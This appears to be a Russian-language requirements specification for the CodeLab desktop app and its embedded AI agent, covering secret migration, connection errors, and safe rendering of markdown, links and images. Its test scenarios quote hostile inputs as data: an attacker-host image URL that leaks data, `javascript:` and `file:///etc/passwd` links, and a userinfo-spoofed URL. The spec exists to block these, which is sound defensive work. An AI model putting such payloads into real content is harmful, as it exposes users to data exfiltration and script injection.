Без сохранённого выбора профиля по умолчанию профилем по умолчанию SHALL быть встроенный агент; профиль `default` из `profiles.json` app не учитывает (design.md change `add-app-settings-shell`, D5).

Требования к поведению:
- **Невалидная или отсутствующая конфигурация** встроенного агента SHALL переводить подключение в `ConnectionFailed` (design.md change `add-embedded-agent-mode`, D13, п. 2). Баннер соединения SHALL показывать текст `EmbeddedAgentConfigException`: проблемы загрузчика в форме `config check` и подсказку `Configure the embedded agent in <home>/config.yaml; check it with: codelab config check`. Значений секретов в нём нет.
- **Нет ключа провайдера.** Подключение SHALL открываться. Первый ход с этим провайдером SHALL завершаться ошибкой провайдера с именем секрета без значения и показываться заметкой «Failed turn» (требование «Failed turn notice with Retry»), как у внешнего агента. Отдельной проверки готовности провайдера при подключении нет.
- **Одобрения, очередь промптов, список сессий, отмена хода и транскрипт** встроенного агента SHALL работать теми же компонентами, что для внешнего агента.
- **Обрыв соединения** (отказ встроенного агента, `ConnectionLost`) SHALL отображаться так же, как обрыв внешнего агента.
- **«Restart agent» во время старта** встроенного агента SHALL прерывать прежнюю попытку без промежуточного `ConnectionFailed`: баннер соединения показывает подключение новой попытки, агент прерванной попытки освобождается резолвером (требование acp-client-kit «Явный автомат соединения»; design.md change `add-embedded-agent-mode`, D6; design.md change `require-project-folder`, Q25 (a)). Параллельные триггеры старта второй попытки не начинают (требование «Агент стартует сам»).
- **Закрытие root scope** SHALL ждать остановки встроенного агента не дольше 10 s. По истечении приложение SHALL писать событие `embedded.close_timeout` уровня `warning` без текста ошибки и продолжать освобождение транспорта и `AcpClientApplication` (D9).

#### Scenario: Выбор встроенного агента
- **WHEN** работает stdio-профиль, пользователь нажимает «Use» в строке «Embedded agent» на странице «Connection», затем «Restart agent»
- **THEN** CodeLab подключается к встроенному агенту без запуска дочернего процесса, а метка подключения — `Embedded agent`

#### Scenario: Встроенный агент по умолчанию
- **WHEN** CodeLab запускается впервые с пустым `CODELAB_HOME`, и пользователь выбирает проект через «Open folder…»
- **THEN** CodeLab стартует встроенного агента

#### Scenario: Нет конфигурации встроенного агента
- **WHEN** `$CODELAB_HOME` не содержит `config.yaml`, и встроенный агент стартует при выборе проекта
- **THEN** подключение в состоянии `ConnectionFailed`, баннер показывает проблему конфигурации и подсказку `Configure the embedded agent in <home>/config.yaml; check it with: codelab config check`, где `<home>` — путь `CODELAB_HOME`

#### Scenario: Невалидный проектный конфиг встроенного агента
- **WHEN** выбранный проект содержит `.codelab/config.yaml` с `budget.max_steps: 0`, и встроенный агент стартует при выборе проекта
- **THEN** подключение в состоянии `ConnectionFailed`, баннер называет файл, строку и ключ `budget.max_steps` и содержит ту же подсказку

#### Scenario: Нет ключа провайдера
- **WHEN** `config.yaml` валиден и задаёт провайдера с `api_key_secret: codelab/p`, секрет `codelab/p` не задан, встроенный агент стартует при выборе проекта, и пользователь создаёт сессию и отправляет промпт
- **THEN** подключение установлено, ход завершается заметкой «Failed turn» с ошибкой провайдера, называющей `codelab/p`, без значения секрета

#### Scenario: Одобрение во встроенном режиме
- **WHEN** встроенный агент спрашивает одобрение `write` в режиме `standard`, и пользователь выбирает вариант отказа в карточке одобрения
- **THEN** файл не изменён, а строка вызова в транскрипте показывает отказ

#### Scenario: Restart agent во время старта встроенного агента
- **WHEN** встроенный агент стартует при выборе проекта, и, пока он ещё открывается, пользователь нажимает «Restart agent»
- **THEN** баннер соединения не показывает `ConnectionFailed` прерванной попытки, подключение завершается исходом второй попытки, а агент первой попытки остановлен

#### Scenario: Зависшая остановка встроенного агента
- **WHEN** root scope закрывается, а остановка встроенного агента не завершается за 10 s
- **THEN** в логе приложения есть `embedded.close_timeout` уровня `warning`, а транспорт и `AcpClientApplication` освобождены

### Requirement: Перенос секретов встроенного агента
Если встроенный агент открыт с `EmbeddedAgent.secretsInConfig == true`, рабочее место CodeLab SHALL показывать над транскриптом предупреждение уровня `warning` (Fluent `InfoBar`, как баннер соединения) с текстом `Secrets are stored in the agent config file.` и кнопкой `Migrate secrets` (решение пользователя 2026-11-04 R8-3; design.md change `add-config-literal-secrets-and-migrate`, D8). Подключение и работа агента при этом НЕ SHALL блокироваться. Закрытие предупреждения крестиком скрывает его до следующего подключения; `Close` после успешного переноса (`applied`) — тоже.

`Migrate secrets` SHALL открывать диалог с планом переноса — строками отчёта `SecretMigrator` для папки, с которой открыт встроенный агент (`cwd` агента, а не текущая папка настроек; `--all`, `--dry-run`), без значений секретов:
- бэкенд только для чтения → текст `Secrets cannot be stored: the env backend is read-only. Add secrets.backend: file to <home>/config.yaml, or set CODELAB_SECRET_* variables.` и только кнопка `Close`;
- конфликт имени с хранилищем → текст конфликта и `Close`; замена существующего секрета в app НЕ SHALL предлагаться;
- все находки только в файле `CODELAB_CONFIG` → строки плана и только `Close`;
- пустой план → `Nothing to migrate.` и только `Close`;
- иначе → `Migrate` и `Cancel`.

Во время переноса диалог НЕ SHALL закрываться (`Esc` и щелчок вне диалога игнорируются); одновременно SHALL выполняться не больше одной операции плана или переноса.

`Migrate` SHALL выполнять перенос тем же движком через порт приложения. Реализация — в composition root через `package:codelab_embedded/io.dart` с тем же `CODELAB_HOME`, `CODELAB_CONFIG` и окружением, что у открывателя встроенного агента; виджеты НЕ SHALL обращаться к файлам и хранилищу. Тексты `planFailed`/`applyFailed` и записи лога app SHALL строиться только из типизированного отчёта или имени типа исключения, НЕ из `error.toString()`. Подсказка для бэкенда `env` на Windows SHALL совпадать с веткой `secret set` (только переменные `CODELAB_SECRET_*`). После успеха диалог SHALL показывать `Secrets moved. Restart the embedded agent to use them.` и кнопку `Restart agent`, которая повторяет подключение тем же профилем; она SHALL быть недоступна, пока идёт ход в любой сессии встроенного агента (подсказка `Wait for the current turn to finish.`), и если за время переноса встроенный агент закрылся или сменился (подсказка `The embedded agent is no longer connected.`); `Close` тогда SHALL переходить по текущему состоянию предложения: нет агента со секретами — предупреждение скрыто, новый агент со секретами — предупреждение показано. Если перенос сорвался после того, как часть файлов уже перенесена (`movedAny`), диалог SHALL показывать перенесённое и предлагать `Restart agent`. Поздний результат плана или переноса после закрытия диалога или новой попытки SHALL отбрасываться. Лог app SHALL писать события `secret_migration.planned`, `secret_migration.applied`, `secret_migration.result_discarded`, `secret_migration.plan_failed`, `secret_migration.apply_failed` только с числами, id бэкенда и именами типов — без путей ключей, имён секретов и текстов.

#### Scenario: Предупреждение и перенос
- **WHEN** встроенный агент открыт с литеральным `api_key` в `<home>/config.yaml` и `secrets.backend: file`, пользователь нажимает `Migrate secrets`, затем `Migrate`
- **THEN** диалог показал строку плана для `providers.<id>.api_key` без значения; после переноса файл содержит `api_key_secret`, а `Restart agent` переподключает встроенного агента, после чего предупреждения нет

#### Scenario: Бэкенд env
- **WHEN** то же, но `secrets.backend` не задан
- **THEN** диалог показывает текст о бэкенде `env` и только `Close`; файл не изменён

#### Scenario: Поздний результат
- **WHEN** пользователь закрывает диалог, пока план ещё строится
- **THEN** результат плана не меняет состояние Cubit и не открывает диалог снова

#### Scenario: Окружение движка совпадает с агентом
- **WHEN** приложение запущено с временными `CODELAB_HOME` и `CODELAB_CONFIG`, и пользователь открывает план
- **THEN** план построен по тем же файлам, что открыватель встроенного агента (`app_scope.dart`), а не по `~/.codelab`

#### Scenario: Папка агента, а не текущая папка
- **WHEN** встроенный агент открыт для проекта `A`, пользователь переключает папку настроек на проект `B` без переподключения и нажимает `Migrate secrets`
- **THEN** план построен по слоям проекта `A`; файлы проекта `B` не читались и не изменены

#### Scenario: Диалог не закрывается во время переноса
- **WHEN** порт `apply` ещё не завершён, а пользователь нажимает `Esc` и повторно `Migrate`
- **THEN** диалог остаётся открытым в состоянии переноса, порт `apply` вызван один раз

#### Scenario: Ход в другой сессии
- **WHEN** перенос завершён (`applied`), а в неактивной сессии встроенного агента идёт ход
- **THEN** `Restart agent` недоступна до конца хода

#### Scenario: Агент сменился во время переноса
- **WHEN** во время `applying` встроенный агент закрывается, а перенос затем завершается
- **THEN** диалог показывает итог переноса, `Restart agent` недоступна с подсказкой `The embedded agent is no longer connected.`, а после `Close` предупреждение скрыто

#### Scenario: Close после переноса
- **WHEN** перенос завершён, и пользователь нажимает `Close`
- **THEN** предупреждение `Secrets are stored in the agent config file.` не показывается до следующего подключения

#### Scenario: Частичный перенос
- **WHEN** перенос записал пользовательский файл и сорвался на проектном (`movedAny`)
- **THEN** диалог показывает строки перенесённого и кнопку `Restart agent`

#### Scenario: Пустой план
- **WHEN** план не содержит ни одного пункта
- **THEN** диалог показывает `Nothing to migrate.` и только `Close`

#### Scenario: Лог без данных конфига
- **WHEN** план и перенос выполнены для `providers.lm.api_key` с секретом `codelab/lm`
- **THEN** лог app содержит `secret_migration.planned` и `secret_migration.applied` с числами и id бэкенда и не содержит `providers.lm`, `codelab/lm` и значения

#### Scenario: Ошибка без текста исключения
- **WHEN** порт бросает исключение, чей `toString()` содержит `sk-test-leak-0123456789`
- **THEN** диалог и лог app показывают имя типа исключения и не содержат `sk-test-leak-0123456789`

### Requirement: Отказ подключения из-за токена в workbench
Если WebSocket-агент отклоняет рукопожатие со статусом 401 или 403 (`tokenRejectionStatus` kit, spec acp-client-kit «Отказ рукопожатия из-за токена»), баннер сбоя подключения в main pane и диагностика `ConnectionCubit` SHALL показывать причину `The agent rejected the token (HTTP <код>).`, если токен был отправлен, и `The agent requires a token (HTTP <код>).`, если нет (`describeConnectFailureByToken` kit отдаёт строчный текст без точки, app делает первую букву заглавной и ставит точку, как в D3; design.md change `add-provider-setup-ui`, D25), вместо общего `Failed to connect ACP transport.`. Остальные ошибки подключения SHALL показываться как раньше. Значение токена, его ссылка и имя переменной НЕ SHALL попадать в баннер, диагностику и журнал.

#### Scenario: Отправленный токен отклонён
- **WHEN** окно подключается к WebSocket-профилю с `tokenRef: env:DEVBOX_TOKEN` (переменная задана значением `sk-test-leak-0123456789`), а сервер отвечает на рукопожатие `401`
- **THEN** баннер и диагностика содержат `The agent rejected the token (HTTP 401).` и не содержат маркера

#### Scenario: Токена нет
- **WHEN** окно подключается к WebSocket-профилю без токена (или с `secret:`, у которого нет значения), а сервер отвечает `403`
- **THEN** баннер и диагностика содержат `The agent requires a token (HTTP 403).`

#### Scenario: Прочие ошибки без изменений
- **WHEN** сервер отвечает на рукопожатие `500` или порт закрыт
- **THEN** баннер показывает прежний текст сбоя подключения, без слов о токене

### Requirement: Встроенный агент без провайдера
Если встроенный агент не открылся только потому, что нет ни одного провайдера с моделью (`providerSetupNeeded` моста `codelab_setup` истинно для снимка конфига, с которым он открывался: нет файла, нет провайдеров или у них нет моделей; spec client-agent-setup «Готовность провайдера»; без `agent.default_model` при провайдере с моделью агент открывается на первой модели, design.md change `optional-default-model`, D3), баннер соединения SHALL показывать `No model provider is configured for the embedded agent.` и действие «Add provider» (ключ `connection-banner-add-provider`) вместо сырого текста проблем (решение пользователя 2026-11-06; design.md change `add-provider-setup-ui`, D26). Признак SHALL определяться по типизированным проблемам загрузчика и составу слоёв конфига, а не по тексту. Прочие ошибки конфига встроенного агента SHALL показываться как раньше.

«Add provider» SHALL открывать мастер провайдера (spec app-settings «Мастер провайдера в app») с целью `user` по умолчанию и неснимаемым «Make default». После `ConfigSaved` app SHALL повторять намерение, вызвавшее неудачный старт встроенного агента (как «Retry», требование «Агент стартует сам»; design.md change `require-project-folder`, D13), если с момента сбоя не начиналась новая попытка старта окна; если началась (с любым профилем), повтора НЕ SHALL быть. Отмена мастера SHALL оставлять баннер.

#### Scenario: Новая установка
- **WHEN** app с пустым `CODELAB_HOME` стартует встроенного агента при выборе проекта
- **THEN** баннер показывает `No model provider is configured for the embedded agent.` и «Add provider», текста `no model is configured` (сырая проблема `config.model.none`, design.md change `optional-default-model`, D4) и `codelab config check` в нём нет

#### Scenario: Провайдер добавлен из баннера
- **WHEN** пользователь нажимает «Add provider» в баннере, проходит мастер и сохраняет провайдера
- **THEN** `config.yaml` содержит провайдера и `agent.default_model` (мастер с неснимаемым «Make default» пишет ключ, D7; для старта агента ключ не обязателен), app повторяет старт встроенного агента, баннер исчезает, а модель видна в селекторе композера

#### Scenario: Другой профиль за время мастера
- **WHEN** мастер открыт из баннера, и пока он открыт, окно начинает старт stdio-профиля (диалог модальный, поэтому тест выбирает профиль `ConnectionCommands.use` и начинает старт `ConnectionCommands.restart`), затем пользователь сохраняет провайдера
- **THEN** конфиг записан, повтора старта встроенного агента нет, агент окна — stdio-профиль, журнал содержит `provider_wizard.reconnect_skipped`

#### Scenario: Прочая ошибка конфига
- **WHEN** `config.yaml` задаёт провайдера и `agent.default_model`, но содержит `budget.max_steps: 0`; либо задаёт провайдера `gw` и `agent.default_model: gw/typo`, которой нет в каталоге
- **THEN** баннер показывает прежний текст проблемы с подсказкой `codelab config check`, действия «Add provider» нет

### Requirement: Тег неизвестного риска одобрения
Строка вызова с ждущим одобрением SHALL показывать для клиентского уровня риска `unknown` тег `Unknown risk` тоном предупреждения, дополняя набор тегов требования «Tool call as a one-line row» (решение пользователя 2026-11-08, design.md change `add-provider-setup-ui`, Q32, D27).

#### Scenario: MCP-инструмент с подсказкой «только чтение»
- **WHEN** встроенный агент запрашивает разрешение на вызов MCP-инструмента, сервер которого объявил `readOnlyHint: true`
- **THEN** строка вызова показывает подпись по имени инструмента и тег `Unknown risk`, а не `Read` и `Read-only`

### Requirement: Заметка исхода хода в ленте
Лента SHALL показывать `NoticeItem` вида `turnStopped` (spec acp-client-kit «Инкрементальная проекция транскрипта») строкой заметки после вывода хода, тем же видом, что заметку `emptyTurn` (design.md change `add-provider-setup-ui`, Q33, D27).

#### Scenario: Молчаливый max_tokens
- **WHEN** ход встроенного агента после размышлений завершается с `stopReason: max_tokens`
- **THEN** лента показывает под размышлениями строку `The model reached its token limit, so the turn ended.`

### Requirement: Ответ агента одним огороженным блоком
Если весь текст ответа агента (`AgentTextItem`) без пробельных строк по краям — ровно один огороженный блок markdown, лента SHALL показывать его блоком кода по требованию «Блок кода в ответе агента»: без строк ограждения, с подписью языка, кнопкой «Copy», сохранением переводов строк и возможностью выделить текст; язык `text` не подсвечивается. Пока ход идёт и закрывающей строки ещё нет, содержимое SHALL показываться моноширинным блоком кода без подсветки, а не сырым текстом (DSK-6). Проза до или после блока и несколько блоков SHALL показываться как markdown (требование «Markdown в ответе агента»). Правило панели «Agent status» (spec app-settings, сценарий «Ответ /mcp list без внешнего ограждения») не меняется (решение пользователя 2026-11-11, design.md change `add-desktop-markdown`, D11; прежнее решение — Q37, D27 change `add-provider-setup-ui`).

#### Scenario: Ответ /mcp list в ленте
- **WHEN** встроенный агент отвечает на `/mcp list` текстом ```` ```text\nMCP servers (1)\n…\n``` ````
- **THEN** лента показывает строки `MCP servers (1)` и таблицу моноширинным блоком кода с подписью `text` и кнопкой «Copy», строк ```` ```text ```` и ```` ``` ```` нет

#### Scenario: Текст вокруг блока
- **WHEN** ответ агента содержит прозу до или после огороженного блока или два блока
- **THEN** лента показывает прозу как markdown, а каждый огороженный блок — блоком кода

#### Scenario: Открывающая строка во время хода
- **WHEN** ход идёт, и ответ пока состоит из строки ```` ```text ```` и одной строки вывода
- **THEN** лента показывает строку вывода моноширинным блоком без подсветки, строки ```` ```text ```` нет

### Requirement: Вызов смены режима и неизвестного вида в ленте
Строка вызова вида `switch_mode` SHALL показывать метку `Mode` и деталь из `ToolRowView` (требование «Строка инструмента без сырого JSON» acp-client-kit). Строка вызова, чей строковый `kind` CodeLab не знает, SHALL выглядеть как строка вызова вида `other`. Пока у такого вызова ждёт одобрение, строка SHALL показывать тег `Unknown risk` (требование «Тег неизвестного риска одобрения», change `add-provider-setup-ui`) и варианты агента без изменений. Строка SHALL NOT показывать wire-имя вида (`switch_mode`, исходное незнакомое значение) (design.md change `tolerate-unknown-tool-kind`, D5, D7).

#### Scenario: Выход из plan-режима ждёт одобрения
- **WHEN** агент запрашивает разрешение на вызов `switch_mode` с `title` "Ready for implementation" и вариантами «Yes, and auto-accept all actions», «Yes, and manually accept actions», «No, stay in architect mode»
- **THEN** строка вызова читается «Mode Ready for implementation», показывает тег `Unknown risk`, раскрыта с панелью решения из трёх вариантов агента и не содержит `switch_mode`

#### Scenario: Вызов незнакомого вида ждёт одобрения
- **WHEN** агент запрашивает разрешение на вызов, которого ещё нет в ходе, с `kind: "future_kind"` и `title` "Plan sync"
- **THEN** строка вызова читается «Plan sync» с тегом `Unknown risk` и не содержит `future_kind`

### Requirement: Markdown в ответе агента
Лента SHALL рисовать текст ответа агента (`AgentTextItem.text`) как markdown без сырых маркеров разметки: заголовки, абзацы с курсивом, жирным, зачёркнутым и inline-кодом, маркированные и нумерованные списки с вложенностью, списки задач с неинтерактивным флажком Fluent, цитаты, таблицы, горизонтальная черта, блоки кода (требование «Блок кода в ответе агента») и формулы в `\(…\)` и `\[…\]`. Знак `$` SHALL оставаться обычным символом. Разбор SHALL выполнять пакет `gpt_markdown` внутри `codelab_ui` (`lib/src/rendering/`) со своими builder'ами и темой из `FluentTheme`, без Material-предка; ядро клиента и app НЕ SHALL разбирать markdown сами. HTML-теги SHALL показываться текстом как написаны и НЕ SHALL становиться элементами разметки, изображениями или ссылками. Цвета SHALL браться только из `FluentTheme`, тонов кита и палитры подсветки (DSK-19). Текст ответа SHALL выделяться мышью в пределах ответа без Material-предка и копироваться Cmd/Ctrl+C; по правому клику SHALL открываться меню Fluent с пунктами «Copy» и «Select all»; ответ НЕ SHALL быть остановкой обхода Tab. Если оценка глубины вложенности хотя бы одной строки ответа — все символы `>` строки, плюс все маркеры списка в любом месте строки, плюс половина колонок пробельных серий ведущего префикса из пробелов, табов (4 колонки), `>` и маркеров списка; строки делятся по `\n`, `\r`, U+2028, U+2029 и U+0085 и считаются в том числе внутри оград — больше предела (`kMaxMarkdownNestingDepth`, 32), ответ SHALL показываться моноширинным простым текстом с пометкой `Shown as plain text: nesting is too deep.` без разбора, и строка НЕ SHALL падать при пересборке. Промпт пользователя и мысли модели SHALL показываться как есть, без разметки (design.md change `add-desktop-markdown`, D1–D4, D7–D9, D14).

#### Scenario: Ответ со smoke без сырых маркеров
- **WHEN** агент отвечает текстом, где «Готово.» обрамлено `**`, `dart test` в строке обрамлено обратными кавычками, а ниже идёт огороженный блок с языком `bash` и строкой `dart test`
- **THEN** лента показывает «Готово.» жирным, `dart test` в строке — inline-кодом, команду — блоком кода с подписью `bash`, а символов `**`, `` ` `` и строк ```` ``` ```` в ленте нет

#### Scenario: Разметка в теме Fluent без Material
- **WHEN** выполняется `acp_markdown_test.dart: renders headings lists tables quotes and inline code` в светлой и тёмной теме Fluent без Material-предка, с заголовками, вложенным списком, списком задач `[ ]`/`[x]`, таблицей и цитатой
- **THEN** исключений нет, заголовки имеют разные стили, задача `[x]` показана отмеченным Fluent `Checkbox` без реакции на клик, таблица и цитата отрисованы, цвета блока кода в тёмной теме — из тёмной палитры

#### Scenario: HTML показывается текстом
- **WHEN** ответ содержит `<b>bold</b>` и `<img src="https://x.example/y.png">`
- **THEN** лента показывает обе строки текстом как написаны, жирного начертания и изображения нет, сетевых запросов нет

#### Scenario: Доллар не формула
- **WHEN** ответ содержит `стоит $5, а $HOME — переменная` и `\(a^2\)`
- **THEN** первая строка показана текстом с символами `$`, а `\(a^2\)` — формулой

#### Scenario: Выделение и меню без Material
- **WHEN** пользователь выделяет мышью часть ответа, нажимает Cmd/Ctrl+C, затем делает правый клик по ответу
- **THEN** буфер содержит выделенный текст без подписи языка блока кода, меню Fluent содержит «Copy» и «Select all», а клавиша Tab из предыдущего элемента ленты переходит мимо ответа

#### Scenario: Глубоко вложенный ответ показывается текстом
- **WHEN** агент отвечает текстом `'> ' * 1000 + 'x'` (около 2 КБ), или одной строкой из 1000 маркеров списка `- - - … x`, или такой строкой внутри огороженного блока, или цитатой глубины 1000, где строки разделены одиночным `\r` или начинаются с U+FEFF, или 600 строками вида `>` + `i` табов + `- x`
- **THEN** в каждом случае лента показывает этот текст моноширинным блоком с пометкой `Shown as plain text: nesting is too deep.`, исключений нет ни при первой сборке, ни после прокрутки строки с экрана и обратно, а остальные строки ленты размечены как обычно

#### Scenario: Мысли без разметки
- **WHEN** агент стримит мысль `**plan**: read files`, затем ответ `**done**`
- **THEN** блок мыслей показывает `**plan**: read files` как есть, а ответ — «done» жирным

### Requirement: Блок кода в ответе агента
Блок кода ответа SHALL показывать подпись языка из info-строки ограды (без языка — без подписи) вне выделения текста, код моноширинным шрифтом с сохранением переводов строк и кнопку «Copy», которая кладёт в буфер обмена исходный код блока без строк ограды. Код SHALL подсвечиваться по языку info-строки из зарегистрированного набора палитрой подсветки действующей темы app (`CodeLabCodeTheme`). У встроенных тем (`light`, `dark`, `high-contrast`; spec app-settings «Режим оформления и темы режимов») палитра SHALL выводиться из ролей `FluentTheme` с контрастом каждого класса токена не ниже 4,5:1 на фоне блока. Роль `code.*` пользовательской темы SHALL применяться как задана, даже если её контраст ниже 4,5:1; о низком контрасте предупреждает страница «Appearance» (spec app-settings «Контраст на фоне кода»). Незаданные роли пользовательской темы SHALL браться из встроенной темы её базы; неизвестный язык или его отсутствие SHALL давать код без подсветки, без автоопределения. Токенизация кода до 300 строк и 16 КиБ MAY выполняться синхронно; код больше этого НЕ SHALL токенизироваться в UI isolate, а до готовности токенов SHALL показываться без цвета; код больше 5000 строк или 256 Ki code units НЕ SHALL подсвечиваться (DSK-5). Код со строкой длиннее 150 code units НЕ SHALL токенизироваться в UI isolate, со строкой длиннее 1000 code units НЕ SHALL подсвечиваться; фоновая токенизация SHALL прерываться через 5 с, и код остаётся без подсветки; повтор того же кода после таймаута или сбоя НЕ SHALL запускать токенизацию заново. Сбой токенизации SHALL оставлять код без подсветки и SHALL сообщаться как ошибка Flutter без текста кода (design.md change `add-desktop-markdown`, D4; design.md change `add-app-appearance-page`, D4, D8).

#### Scenario: Язык и копирование
- **WHEN** выполняется `acp_markdown_test.dart: code block shows language and copy puts raw code into clipboard` для блока ```` ```dart ```` с двумя строками
- **THEN** блок показывает подпись `dart`, нажатие `code-copy-<rowId>-0` кладёт в буфер ровно две строки кода без ```` ``` ````, а выделение всего ответа не содержит подписи `dart`; второй блок с тем же кодом в том же ответе имеет ключ `code-copy-<rowId>-1`

#### Scenario: Большой блок подсвечивается вне UI isolate
- **WHEN** выполняется `acp_markdown_test.dart: large code block is highlighted off the UI isolate` для блока `dart` из 1000 строк
- **THEN** `highlightSyncRuns` равен 0, до результата код показан без цвета, после результата строка перерисована один раз

#### Scenario: Неизвестный язык
- **WHEN** блок кода имеет язык `foolang`
- **THEN** код показан моноширинно без подсветки, подпись `foolang` видна, «Copy» работает

#### Scenario: Роль пользовательской темы с низким контрастом
- **WHEN** действует пользовательская тема с `"code": {"background": "#14121f", "comment": "#3a3650"}`, и в ответе есть блок `dart` с комментарием
- **THEN** комментарий нарисован цветом `#3a3650` на фоне `#14121f`, цвет не подобран под порог

### Requirement: Стриминг markdown без перестройки закрытых блоков
Пока ответ стримится, лента SHALL перестраивать только незакрытый хвост ответа: закрытый блок SHALL строиться не больше одного раза за время стрима, и обновление хвоста НЕ SHALL перестраивать закрытые блоки и другие строки ленты (DSK-3). Тема и builder'ы отрисовки SHALL создаваться один раз на тему Fluent и переиспользоваться между сборками. Незакрытая ограда в хвосте SHALL рисоваться моноширинным текстом без подсветки; подсветка SHALL запускаться только для закрытой ограды (DSK-6). Следование за хвостом и автопрокрутка к одобрению SHALL работать как раньше (требование «Лента transcript следует за хвостом») (design.md change `add-desktop-markdown`, D3).

#### Scenario: 200 дельт
- **WHEN** выполняется `acp_markdown_test.dart: streaming 200 chunks builds each closed block once` для ответа с заголовками и тремя блоками кода
- **THEN** после всех 200 обновлений `codeBlockBuilds` каждого закрытого блока кода и `headingBuilds` каждого заголовка равны 1

#### Scenario: Длинный ответ
- **WHEN** тот же тест выполняется для ответа 48 КБ
- **THEN** первый блок кода смонтирован и построен один раз, подсветка для него запускалась не больше одного раза

#### Scenario: Ограда закрывается во время стрима
- **WHEN** выполняется `acp_markdown_test.dart: unclosed fence in tail renders plain and highlights after close`: пришли строки ```` ```dart ```` и `final a = 1;`, затем закрывающая ограда
- **THEN** до закрывающей ограды код показан моноширинно без подсветки и без `highlightRuns`, после неё блок подсвечен, а абзац перед блоком не перестраивался

### Requirement: Ссылки в ответе агента
Ссылка в ответе SHALL быть активной, только если её адрес имеет схему `http` или `https` с непустым хостом либо `mailto` с непустым адресом, и в адресе нет userinfo (`https://good.com@evil.com` — обычный текст); решение об активности SHALL принимать app и передавать ленте. Активная ссылка SHALL переноситься вместе с абзацем. `mailto` SHALL быть активной, только если каждый адресат из пути после раскодирования — простой `local@domain` без `?`, `&`, `%`, пробелов, CR и LF. При открытии `mailto` SHALL сохраняться только адресаты из пути и `subject` (с битым `%`-escape `subject` отбрасывается); `cc`, `bcc`, `body`, `attach` и прочие параметры SHALL отбрасываться. Адреса локальной сети SHALL обрабатываться как любые другие (риск принят пользователем 2026-11-11). Активная ссылка SHALL показываться подчёркнутой акцентным цветом с полным адресом во всплывающей подсказке (управляющие символы и символы направления текста — видимыми escape-последовательностями) и SHALL открываться внешним приложением по клику пользователя через порт платформы, который повторно проверяет схему. Ссылки с другими схемами (`file:`, `javascript:`, `data:`, `vscode:`, `xmpp:` и прочие), protocol-relative адреса и относительные пути SHALL показываться обычным текстом и НЕ SHALL открываться. Ссылка НЕ SHALL открываться без клика пользователя (DSK-7). Журнал открытия SHALL содержать схему, хост и исход и НЕ SHALL содержать путь, query и fragment (design.md change `add-desktop-markdown`, D5, D12).

#### Scenario: Ссылка https открывается по клику
- **WHEN** выполняется `acp_markdown_test.dart: link tap calls onOpenLink and non-http schemes are not tappable` для `[docs](https://example.com/a?token=abc)`, а в app пользователь кликает по `docs`
- **THEN** подсказка показывает `https://example.com/a?token=abc`, порт открывает адрес один раз, в журнале есть `scheme=https`, `host=example.com` и нет `token=abc`

#### Scenario: Userinfo и mailto
- **WHEN** ответ содержит `[a](https://good.com@evil.com/x)` и `[m](mailto:a@b.example?subject=Hi&cc=c@d.example&body=text)`, и пользователь кликает по `m`
- **THEN** `a` показана обычным текстом без реакции на клик, а порт открывает `mailto:a@b.example?subject=Hi` без `cc` и `body`

#### Scenario: Опасные схемы не открываются
- **WHEN** ответ содержит `[x](javascript:alert(1))`, `[f](file:///etc/passwd)`, `[d](data:text/html,hi)`, `[v](vscode://open)`, `[p](//evil.example/a)` и `<xmpp:a@b>`
- **THEN** каждая из них показана обычным текстом без подчёркивания, клик не вызывает порт открытия ссылок

### Requirement: Изображения в ответе агента
Изображение из ответа агента НЕ SHALL загружаться без явного действия пользователя: по умолчанию лента SHALL показывать заглушку с подписью «Image», хостом и именем файла, с полным адресом в подсказке. Кнопка «Show image» SHALL показываться только для адреса со схемой `https`, непустым хостом и без userinfo; загрузка SHALL ограничиваться телом 32 МБ, таймаутами 10 с на соединение и 30 с на загрузку и размером декодирования 1440×1440, а картинка с размерами из заголовка больше 40 млн пикселей или стороной больше 16 384 SHALL отклоняться до декодирования, редирект на адрес, не прошедший ту же проверку (в том числе на `http`), НЕ SHALL приниматься; изображение SHALL загружаться только после нажатия этой кнопки. Для `http`, `data:`, `file:` и относительных адресов SHALL оставаться заглушка без кнопки. Выбор пользователя SHALL относиться к одной строке ленты и одному адресу, SHALL переживать уход строки с экрана и НЕ SHALL сохраняться между запусками. Ни отрисовка markdown, ни HTML ответа НЕ SHALL выполнять сетевых запросов до нажатия (VIEW-12, DSK-7; design.md change `add-desktop-markdown`, D6).

#### Scenario: Нет запросов до клика
- **WHEN** выполняется `acp_markdown_test.dart: markdown image is not fetched before user action` для `![](https://attacker.example/?d=secret)` и `![p](https://x.example/p.svg)` с перехватом сети
- **THEN** сетевых запросов нет, обе картинки показаны заглушками с хостом и кнопкой «Show image»

#### Scenario: Загрузка по клику
- **WHEN** пользователь нажимает «Show image» у `https://x.example/y.png`, прокручивает ленту так, что строка уходит с экрана, и возвращается
- **THEN** изображение запрошено один раз и показано, после возврата оно по-прежнему показано

#### Scenario: Небезопасный адрес изображения
- **WHEN** ответ содержит `![a](http://x.example/y.png)` и `![b](data:image/png;base64,AAAA)`
- **THEN** обе картинки показаны заглушками без кнопки «Show image», сетевых запросов нет

### Requirement: Без выбранного проекта нет папки агента и сессий
Агент (процесс stdio, встроенный агент, соединение WebSocket) и сессия в desktop SHALL получать папку только из выбранного проекта или из `cwd` существующей сессии (требование «Project selection is independent of the connection type»; design.md change `require-project-folder`, D1, D2, D3, D5, D9).

- **«New session» без проекта** НЕ SHALL создавать сессию, НЕ SHALL запускать агента и НЕ SHALL отправлять агенту сообщений. Вместо этого она SHALL открывать системный выбор папки, как «Open folder…». Выбранная папка становится проектом (это триггер старта агента), а сессия автоматически не создаётся.
- **Папки нет на диске.** Если папка триггера локального профиля (встроенный агент, stdio) исчезла, агент для неё НЕ SHALL запускаться, а сессия НЕ SHALL создаваться или загружаться. Причина `Project folder not found: <path>. Choose an existing folder with Open folder….` SHALL попадать в диагностику уровня `error` с источником `project`.
- **Ожидание восстановления.** Пока проект прошлого запуска восстанавливается, «New session», «Restart agent» и старт при запуске SHALL ждать его не дольше 2 с. Если после ожидания проекта нет, агент НЕ SHALL стартовать: «New session» SHALL открывать выбор папки, «Restart agent» без прежнего корня SHALL отклоняться до обращения к workspace с событием `connection.connect_rejected {reason: no_project, profile_id}` без пути, а старт при запуске SHALL не выполняться (design.md change `require-project-folder`, D3, D19). Итерация A применяла это правило к кнопкам «Connect» и «Reconnect», которых после итерации B нет.
- **Одна папка на намерение.** Намерение (выбор проекта, новая сессия, фокус, перезапуск) SHALL читать папку один раз. Проверка существования, старт агента и `session/new` / `session/load` SHALL получать одно и то же значение.
- **Встроенный агент** без папки SHALL не открываться: резолвер отказывает `ClientWorkspaceException`, не вызывая открыватель.

